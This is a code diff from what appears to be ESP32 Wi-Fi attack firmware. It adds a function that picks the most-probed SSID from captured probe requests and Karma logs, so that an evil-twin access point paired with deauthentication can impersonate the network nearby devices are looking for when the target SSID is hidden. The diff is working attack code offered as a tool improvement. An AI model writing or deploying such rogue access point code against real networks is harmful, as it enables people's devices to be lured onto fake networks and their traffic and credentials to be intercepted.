@@ -1772,12 +1772,42 @@ void stopAllAttacks() {
 // ── Evil Twin  [PATCH 5 MAC cloning] ──
 void stopEvilTwin();
 
+String getBestDiscoveredSSID() {
+  String best = "";
+  int bestCount = 0;
+
+  portENTER_CRITICAL(&g_probeLogMux);
+  for (int i = 0; i < g_probeLogCount; i++) {
+    int idx = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
+    if (g_probeLog[idx].ssid[0] != 0 && (int)g_probeLog[idx].count > bestCount) {
+      best = String(g_probeLog[idx].ssid);
+      bestCount = g_probeLog[idx].count;
+    }
+  }
+  portEXIT_CRITICAL(&g_probeLogMux);
+
+  for (int i = 0; i < g_karmaSSIDCount; i++) {
+    if (g_karmaSSIDs[i].ssid[0] != 0 && (int)g_karmaSSIDs[i].probeCount > bestCount) {
+      best = String(g_karmaSSIDs[i].ssid);
+      bestCount = g_karmaSSIDs[i].probeCount;
+    }
+  }
+  return best;
+}
+
 void startEvilTwinWithDeauth() {
   WiFi.mode(WIFI_AP_STA);
   delay(100);
 
   String safeSSID = targetSSID;
-  if (safeSSID.length() == 0) safeSSID = "Free_WiFi";
+  if (safeSSID.length() == 0) {
+    safeSSID = getBestDiscoveredSSID();
+    if (safeSSID.length() == 0) {
+      safeSSID = "Free_WiFi";
+    } else {
+      Serial.printf("[EVIL TWIN] SSID hidden -> pakai hasil Probe/Karma: %s\n", safeSSID.c_str());
+    }
+  }
 
   bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
   if (!apSuccess) {
